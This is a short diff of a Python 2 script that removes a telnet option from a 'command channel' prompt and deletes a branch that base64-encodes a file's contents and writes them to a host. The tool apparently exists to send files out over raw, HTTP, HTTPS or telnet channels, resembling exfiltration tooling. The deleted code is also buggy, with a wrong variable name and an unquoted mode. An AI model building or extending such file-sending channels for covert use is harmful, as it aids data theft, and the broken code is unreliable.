@@ -37,7 +37,7 @@ def main():
 		return
 
 	# Prompt user for connection method
-	proto = str(raw_input("Choose command channel: (raw/http/https/telnet) "))
+	proto = str(raw_input("Choose command channel: (raw/http/https) "))
 	
 	# Socket only connection
 	if proto == "raw":
@@ -111,14 +111,5 @@ def main():
 		#close socket connection
 		s.close()
 		
-	elif proto == 'telnet':
-		tn = telnetlib.Telnet()
-		n.open(host)
-		with open(filename, rb) as f:
-			content = f.read()
-
-		content_serialized = base64.b64encode(content)
-
-		tn.write(content_serialized)
 	return
 main()
